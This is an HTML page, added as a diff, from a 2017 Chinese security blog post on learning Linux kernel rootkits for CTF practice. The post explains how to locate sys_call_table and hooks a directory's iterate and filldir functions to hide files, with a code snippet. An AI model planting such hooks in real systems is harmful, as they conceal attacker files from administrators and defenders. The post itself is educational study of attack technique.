@@ -1,0 +1,865 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="rootkit,hooing system," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="昨天做csaw 2014 ctf的kernel exploit，突然发现代码有点看不懂，但好像又似曾相识的感觉~后来想起来是在freebuf上看了linux rootkit的教程，但是那时看的不是很懂…，现在看，有种豁然开朗的感觉，所以就干脆学习一番。">
+<meta name="keywords" content="rootkit,hooing system">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel Rootkit Learning">
+<meta property="og:url" content="http://yoursite.com/2017/08/25/Linux-Kernel-Rootkit-Learning/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="昨天做csaw 2014 ctf的kernel exploit，突然发现代码有点看不懂，但好像又似曾相识的感觉~后来想起来是在freebuf上看了linux rootkit的教程，但是那时看的不是很懂…，现在看，有种豁然开朗的感觉，所以就干脆学习一番。">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Kernel Rootkit Learning">
+<meta name="twitter:description" content="昨天做csaw 2014 ctf的kernel exploit，突然发现代码有点看不懂，但好像又似曾相识的感觉~后来想起来是在freebuf上看了linux rootkit的教程，但是那时看的不是很懂…，现在看，有种豁然开朗的感觉，所以就干脆学习一番。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/08/25/Linux-Kernel-Rootkit-Learning/"/>
+
+
+  <title> Linux Kernel Rootkit Learning | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Linux Kernel Rootkit Learning
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-08-25T12:27:29+08:00" content="2017-08-25">
+              2017-08-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/kernel-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">kernel_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/08/25/Linux-Kernel-Rootkit-Learning/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/25/Linux-Kernel-Rootkit-Learning/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>昨天做csaw 2014 ctf的kernel exploit，突然发现代码有点看不懂，但好像又似曾相识的感觉~后来想起来是在freebuf上看了linux rootkit的教程，但是那时看的不是很懂…，现在看，有种豁然开朗的感觉，所以就干脆学习一番。<br><a id="more"></a></p>
+<h2 id="linux-rootkit系列教程："><a href="#linux-rootkit系列教程：" class="headerlink" title="linux rootkit系列教程："></a>linux rootkit系列教程：</h2><p><a href="http://www.freebuf.com/articles/system/54263.html" target="_blank" rel="external">Linux Rootkit系列一：LKM的基础编写及隐藏</a><br><a href="http://www.freebuf.com/sectool/105713.html" target="_blank" rel="external">Linux Rootkit 系列二：基于修改 sys_call_table 的系统调用挂钩</a><br><a href="http://www.freebuf.com/articles/system/107829.html" target="_blank" rel="external">Linux Rootkit系列三：实例详解 Rootkit 必备的基本功能</a><br><a href="http://www.freebuf.com/articles/system/108392.html" target="_blank" rel="external">Linux Rootkit 系列四：对于系统调用挂钩方法的补充</a><br><a href="http://www.freebuf.com/articles/system/109034.html" target="_blank" rel="external">Linux Rootkit 系列五：感染系统关键内核模块实现持久化</a></p>
+<h2 id="Hooking-Syscall"><a href="#Hooking-Syscall" class="headerlink" title="Hooking Syscall"></a>Hooking Syscall</h2><p>因为hooking sys_call_table中的系统调用在rootkit中扮演者很重要的角色，所以我们首先要做的就是学会hooking a syscall。其中最重要的就是finding the address of sys_call_table。教程中讲了好几种方法获得sys_call_table的地址：</p>
+<ol>
+<li>force searching</li>
+<li>reading System.map</li>
+<li>with IDT<br>原理都比较简单，一看就懂，也不需要特别强调什么的。<br>然后需要解决的是写保护——因为sys_call_table所在的内存是有写保护的。这部分也不难，可以调用内核提供的操作寄存机CR0的接口。<br>在修改sys_call_table中的函数指针时要注意，我们必须要先保存原来的函数地址，因为在hooking的时候以及后面恢复系统调用时会用到。</li>
+</ol>
+<h2 id="Hidding-what-you-want"><a href="#Hidding-what-you-want" class="headerlink" title="Hidding what you want"></a>Hidding what you want</h2><p>其实我着重看的是教程中的系列三，很有趣，也很有用。但是跟教程里说的一样，我把重点中的重点放在了hidding file上，学会hidding file了，其他的基本也就会了。<br>文件的ls是通过系统调用getdents实现的，我们来看看getdents实现的<a href="http://elixir.free-electrons.com/linux/v3.13/source/fs/readdir.c#L192" target="_blank" rel="external">源码</a>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	d_ino;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	d_off;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>	d_reclen;</div><div class="line">	<span class="keyword">char</span>			d_name[<span class="number">1</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line">SYSCALL_DEFINE3(getdents, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd,</div><div class="line">		struct linux_dirent __user *, dirent, <span class="keyword">unsigned</span> <span class="keyword">int</span>, count)</div><div class="line">&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> __<span class="title">user</span> * <span class="title">lastdirent</span>;</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">getdents_callback</span> <span class="title">buf</span> = &#123;</span></div><div class="line">		.ctx.actor = filldir,</div><div class="line">		.count = count,</div><div class="line">		.current_dir = dirent</div><div class="line">	&#125;;</div><div class="line">	<span class="keyword">int</span> error;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (!access_ok(VERIFY_WRITE, dirent, count))</div><div class="line">		<span class="keyword">return</span> -EFAULT;</div><div class="line"></div><div class="line">	f = fdget(fd);</div><div class="line">	<span class="keyword">if</span> (!f.file)</div><div class="line">		<span class="keyword">return</span> -EBADF;</div><div class="line"></div><div class="line">	error = iterate_dir(f.file, &amp;buf.ctx);</div><div class="line">	<span class="keyword">if</span> (error &gt;= <span class="number">0</span>)</div><div class="line">		error = buf.error;</div><div class="line">	lastdirent = buf.previous;</div><div class="line">	<span class="keyword">if</span> (lastdirent) &#123;</div><div class="line">		<span class="keyword">if</span> (put_user(buf.ctx.pos, &amp;lastdirent-&gt;d_off))</div><div class="line">			error = -EFAULT;</div><div class="line">		<span class="keyword">else</span></div><div class="line">			error = count - buf.count;</div><div class="line">	&#125;</div><div class="line">	fdput(f);</div><div class="line">	<span class="keyword">return</span> error;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到sys_getdents主要调用了iterate_dir，我们再来看iterate_dir:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_context</span> &#123;</span></div><div class="line">	<span class="keyword">const</span> <span class="keyword">filldir_t</span> actor;</div><div class="line">	<span class="keyword">loff_t</span> pos;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">file_inode</span>(<span class="title">file</span>);</span></div><div class="line">	<span class="keyword">int</span> res = -ENOTDIR;</div><div class="line">	<span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</div><div class="line">		<span class="keyword">goto</span> out;</div><div class="line"></div><div class="line">	res = security_file_permission(file, MAY_READ);</div><div class="line">	<span class="keyword">if</span> (res)</div><div class="line">		<span class="keyword">goto</span> out;</div><div class="line"></div><div class="line">	res = mutex_lock_killable(&amp;inode-&gt;i_mutex);</div><div class="line">	<span class="keyword">if</span> (res)</div><div class="line">		<span class="keyword">goto</span> out;</div><div class="line"></div><div class="line">	res = -ENOENT;</div><div class="line">	<span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</div><div class="line">		ctx-&gt;pos = file-&gt;f_pos;</div><div class="line">		res = file-&gt;f_op-&gt;iterate(file, ctx);</div><div class="line">		file-&gt;f_pos = ctx-&gt;pos;</div><div class="line">		file_accessed(file);</div><div class="line">	&#125;</div><div class="line">	mutex_unlock(&amp;inode-&gt;i_mutex);</div><div class="line">out:</div><div class="line">	<span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line">EXPORT_SYMBOL(iterate_dir);</div></pre></td></tr></table></figure></p>
+<p>这部分操作主要是调用file_operations里面的iterate函数，然后我们再来查找<a href="http://elixir.free-electrons.com/linux/v3.13/source/fs/ext4/dir.c#L505" target="_blank" rel="external">vfs</a>的file_operations的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_dir_operations</span> = &#123;</span></div><div class="line">	.llseek		= ext4_dir_llseek,</div><div class="line">	.read		= generic_read_dir,</div><div class="line">	.iterate	= ext4_readdir,</div><div class="line">	.unlocked_ioctl = ext4_ioctl,</div><div class="line">#ifdef CONFIG_COMPAT</div><div class="line">	.compat_ioctl	= ext4_compat_ioctl,</div><div class="line">#endif</div><div class="line">	.fsync		= ext4_sync_file,</div><div class="line">	.release	= ext4_release_dir,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>可以看到，iterate的实现是ext4_readdir，再次跟进去貌似有点难读了，难怪作者也是跟到这没怎么详细讲了~只是粗略地讲了下过程：ext4_readdir最终会通过filldir把目录里面的项目一个一个的填到getdents返回的缓冲区里，缓冲区里是一个个的linux_dirent。<br>总的来说，调用层次如下：<br>sys_getdents-&gt; iterate_dir-&gt; struct file_operations 里的iterate-&gt;省略若干层次 -&gt; struct dir_context 里的actor(mostly filldir)。<br>要达到隐藏文件的目的，我们需要hooking filldir，在hooking function中去掉我们需要隐藏的文件记录，不填到缓冲区，这样应用程序就收不到相应的记录，也就打到了隐藏文件的目的。</p>
+<p>具体思路是hooking相应目录的iterate，把dir_context的actor改为fake filldir，fake filldir把隐藏的文件过滤。下面是作者的实现：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">fake_iterate</span><span class="params">(struct file *filp, struct dir_context *ctx)</span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// 备份真的 ``filldir``，以备后面之需。</span></div><div class="line">    real_filldir = ctx-&gt;actor;</div><div class="line"></div><div class="line">    <span class="comment">// 把 ``struct dir_context`` 里的 ``actor``，</span></div><div class="line">    <span class="comment">// 也就是真的 ``filldir``</span></div><div class="line">    <span class="comment">// 替换成我们的假 ``filldir``</span></div><div class="line">    *(<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor = fake_filldir;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> real_iterate(filp, ctx);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">fake_filldir</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namlen,</span></div><div class="line">             <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(name, SECRET_FILE, <span class="built_in">strlen</span>(SECRET_FILE)) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">// 如果是需要隐藏的文件，直接返回，不填到缓冲区里。</span></div><div class="line">        fm_alert(<span class="string">"Hiding: %s"</span>, name);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/* pr_cont("%s ", name); */</span></div><div class="line"></div><div class="line">    <span class="comment">// 如果不是需要隐藏的文件，</span></div><div class="line">    <span class="comment">// 交给的真的 ``filldir`` 把这个记录填到缓冲区里。</span></div><div class="line">    <span class="keyword">return</span> real_filldir(ctx, name, namlen, offset, ino, d_type);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>看这类文章真的能学到好多，作者写的也真心不错。其他的也粗略地看了下，思路都差不多。还有那个系列五也非常有趣，下次碰到相应的问题再来详细研究。<br>有趣，接下来去做2014 csaw ctf的kernel exploit了。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/rootkit/" rel="tag">#rootkit</a>
+          
+            <a href="/tags/hooing-system/" rel="tag">#hooing system</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/22/2013-CSAW-CTF-Kernel-Exploit/" rel="next" title="2013 CSAW CTF Kernel Exploit">
+                <i class="fa fa-chevron-left"></i> 2013 CSAW CTF Kernel Exploit
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/26/2014-CSAW-CTF-Kernel-Exploit/" rel="prev" title="2014 CSAW CTF Kernel Exploit">
+                2014 CSAW CTF Kernel Exploit <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">54</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">87</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://y0ung.tech" title="y0ung" target="_blank">y0ung</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-rootkit系列教程："><span class="nav-number">1.</span> <span class="nav-text">linux rootkit系列教程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hooking-Syscall"><span class="nav-number">2.</span> <span class="nav-text">Hooking Syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidding-what-you-want"><span class="nav-number">3.</span> <span class="nav-text">Hidding what you want</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/08/25/Linux-Kernel-Rootkit-Learning/';
+      var disqus_title = "Linux Kernel Rootkit Learning";
+      var disqus_url = 'http://yoursite.com/2017/08/25/Linux-Kernel-Rootkit-Learning/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
